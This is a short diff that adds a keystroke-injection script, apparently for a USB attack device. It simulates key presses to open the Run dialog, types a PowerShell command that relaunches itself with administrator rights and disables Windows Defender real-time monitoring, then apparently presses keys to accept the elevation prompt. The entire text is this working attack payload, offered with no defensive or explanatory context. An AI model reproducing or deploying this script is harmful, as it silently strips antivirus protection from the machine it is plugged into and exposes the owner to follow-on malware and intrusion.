@@ -1,0 +1,3 @@
+Press: 131 + 114
+Print: powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
+Press: 130 + 121
